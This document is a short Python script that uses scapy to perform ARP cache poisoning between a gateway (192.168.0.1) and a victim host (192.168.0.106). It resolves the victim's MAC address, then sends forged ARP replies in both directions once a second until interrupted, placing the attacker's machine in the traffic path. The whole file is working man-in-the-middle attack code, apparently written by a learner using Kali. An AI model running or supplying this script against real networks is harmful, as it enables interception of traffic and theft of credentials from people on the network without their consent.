#!/usr/bin/env python

import scapy.all as scapy
import time


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answeres_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answeres_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):

    target_mac_address = get_mac(target_ip=target_ip)
    packet = scapy.ARP(op=2, 
                       pdst=target_ip,
                       hwdst=target_mac_address, 
                       psrc=spoof_ip,
                       ) # sending response to the gatway telling that 192.168.0.1 has kali machine mac address to redirect traffic

    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

sent_packet_count=0

try:
    while True:
        spoof("192.168.0.1","192.168.0.106")
        spoof("192.168.0.106","192.168.0.1")
        sent_packet_count+=2
        print("\r[+] Packets Sent: "+str(sent_packet_count), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Quitting.")






